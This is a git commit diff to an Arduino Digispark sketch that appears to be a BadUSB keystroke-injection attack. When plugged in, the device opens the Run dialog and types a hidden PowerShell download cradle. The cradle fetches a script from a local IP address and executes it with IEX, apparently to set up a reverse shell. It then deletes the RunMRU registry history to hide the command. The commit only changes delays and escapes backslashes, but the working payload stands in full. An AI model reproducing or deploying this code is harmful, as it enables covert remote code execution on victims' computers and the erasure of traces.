610e649822534ebb4e752e8baeb82773af2e08c8
Marco Petronio <87567996+marcoigorr@users.noreply.github.com>
2022-02-10 00:33:54 +0100

    Update OneLineRS_powershell.ino

--- OneLineRS_powershell.ino
+++ OneLineRS_powershell.ino
@@ -21,20 +21,16 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("powershell -windowstyle hidden (New-Object system.net.webclient).downloadstring('http://192.168.1.102/download_cradle.ps1') | IEX");
-  DigiKeyboard.delay(300);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(300);
   DigiKeyboard.update();
 
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(800);
 
   DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell -windowstyle hidden -Exec Bypass Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue");
-  DigiKeyboard.delay(300);
+  DigiKeyboard.print("powershell -windowstyle hidden -Exec Bypass Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(300);
-  DigiKeyboard.update(); 
   
   digiEnd();
 }
